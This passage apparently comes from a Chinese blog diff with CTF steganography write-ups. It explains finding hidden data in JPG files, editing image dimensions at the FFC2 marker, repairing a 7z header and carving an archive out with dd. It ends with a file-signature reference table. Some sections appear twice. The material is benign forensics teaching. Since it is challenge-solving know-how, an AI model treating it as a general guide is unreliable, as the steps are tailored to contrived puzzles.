+<p><strong>3、发现新大陆，有flag但有一部分被隐藏了，放到kali里binwalk下出来两张图，改下大小发现跟原来的一样flag有几个打了马赛克，在到两张图里去看看有没有隐藏信息，发现在<code>FFD9</code>图片结束尾部特征，二进制编码后面发现有个像 7z的文件标识头的东西，尝试去修复文件标识头改为<code>37 7A BC AF 27 1C</code>保存再到kali里去</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/78ee791c8b46d881387c4332c5ac5db8.png" alt="1605231685080" loading="lazy"></strong></p>
+<p><strong>4、将这一段数据提取出来并保存为压缩包的格式命令为<code>dd if=lunjian.jpg of=1.zip skip=9591 bs=1</code>得到压缩包解压，再将图片更改高度发现与之前的flag遮挡有错位，组合得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/1464276c722f66c8efc1044e52f2acc1.png" alt="1605232713347" loading="lazy"></strong></p>
+<p><strong>kali里dd命令使用方法</strong></p>
+<pre><code>使用dd命令分离文件，如:
+dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163
+if=file（源文件）
+of=file（输出文件）
+bs=bytes（一次性转换bytes个字节，及转换缓冲区大小）
+skip=blocks（输入文件开头跳过blocks个块再开始复制--通俗点讲就是从哪开始）
+</code></pre>
+<p><strong>常见文件头标识</strong></p>
+<pre><code>常见的文件头：
+7z
+文件头标识：37 7A BC AF 27 1C
+JPEG/JPG
+文件头标识: ff, d8 (SOI) (JPEG 文件标识) 
+文件结束标识: ff, d9 (EOI) 
+PNG
+文件头标识：89 50 4E 47 0D 0A 1A 0A
+GIF
+文件头标识：47 49 46 38 39(37) 61 GIF89(7)a
+BMP
+文件头标识：42 4D--- BM
+HTML (html)
+文件头标识：68746D6C3E 
+ZIP Archive (zip)
+文件头标识：504B0304  PK
+RAR Archive (rar)
+文件头标识：52617221 
+等等..
+</code></pre>
+<h2 id="0x027-图穷匕见"><strong>0x027  图穷匕见⭐</strong></h2>
+<h3 id="考点-2"><strong>考点</strong></h3>
+<p>rd文件放进kali里分离出个文件在里面找flag**</p>
+<p><strong>5、得到一个base64加密的文件，解密得到flag</strong></p>
+<h2 id="0x026论剑-2"><strong>0x026	论剑⭐⭐⭐⭐</strong></h2>
+<h3 id="考点-3"><strong>考点</strong></h3>
+<ul>
+<li><strong>JPG图片宽高尺寸的更改位置<code>FFC2</code></strong></li>
+<li><strong>文件标识头7z:<code>37 7A BC AF 27 1C</code></strong></li>
+<li><strong>在kali中部分数据提取命令<code>dd</code></strong></li>
+</ul>
+<h3 id="解题思路-62"><strong>解题思路：</strong></h3>
+<p><strong>1、用010打开图片，发现是由两张图片组成的，在两张图片的头尾交接处发现有一串二进制的数，尝试将他转为Ascii码得到一串字符<code>mynameiskey!!!hhh</code></strong></p>
+<p><strong>2、到这里思路断了，尝试去改高度，百度后发现JPG的高度是在16进制<code>FFC2</code>处再往后三个字节就是图片大小尺寸</strong></p>
+<p><strong>普通的JPG的图片大小尺寸都在<code>FFC2</code>后三个字节处开始，总共就两个字节</strong></p>
+<p><strong>[外链图片转存中...(img-FC1IvBoC-1608735278163)]</strong></p>
+<p><strong>3、发现新大陆，有flag但有一部分被隐藏了，放到kali里binwalk下出来两张图，改下大小发现跟原来的一样flag有几个打了马赛克，在到两张图里去看看有没有隐藏信息，发现在<code>FFD9</code>图片结束尾部特征，二进制编码后面发现有个像 7z的文件标识头的东西，尝试去修复文件标识头改为<code>37 7A BC AF 27 1C</code>保存再到kali里去</strong></p>
+<p><strong>[外链图片转存中...(img-94LmHb9Z-1608735278164)]</strong></p>
+<p><strong>4、将这一段数据提取出来并保存为压缩包的格式命令为<code>dd if=lunjian.jpg of=1.zip skip=9591 bs=1</code>得到压缩包解压，再将图片更改高度发现与之前的flag遮挡有错位，组合得到flag</strong></p>
+<p><strong>[外链图片转存中...(img-TLzba6ZW-1608735278166)]</strong></p>
+<p><strong>kali里dd命令使用方法</strong></p>
+<pre><code>使用dd命令分离文件，如:
+dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163
+if=file（源文件）
+of=file（输出文件）
+bs=bytes（一次性转换bytes个字节，及转换缓冲区大小）
+skip=blocks（输入文件开头跳过blocks个块再开始复制--通俗点讲就是从哪开始）
+</code></pre>
+<p><strong>常见文件头标识</strong></p>
+<pre><code>常见的文件头：
+7z
+文件头标识：37 7A BC AF 27 1C
+JPEG/JPG
+文件头标识: ff, d8 (SOI) (JPEG 文件标识) 
+文件结束标识: ff, d9 (EOI) 
+PNG
+文件头标识：89 50 4E 47 0D 0A 1A 0A
+GIF
+文件头标识：47 49 46 38 39(37) 61 GIF89(7)a
+BMP
+文件头标识：42 4D--- BM
+HTML (html)
+文件头标识：68746D6C3E 
+ZIP Archive (zip)
+文件头标识：504B0304  PK
+RAR Archive (rar)
+文件头标识：52617221 
+等等..
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">如果你专注于过去，你将永远看不到未来！</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/YGLF" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/YGLF" target="_blank">YGLF</a>
+    </div>
+    <div>
+        Theme by <a href="https://imhanjie.com/" target="_blank">imhanjie</a>, Powered by <a
+                href="https://github.com/getgridea/gridea" target="_blank">Gridea | <a href="https://yglf.github.io/yageluofu.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
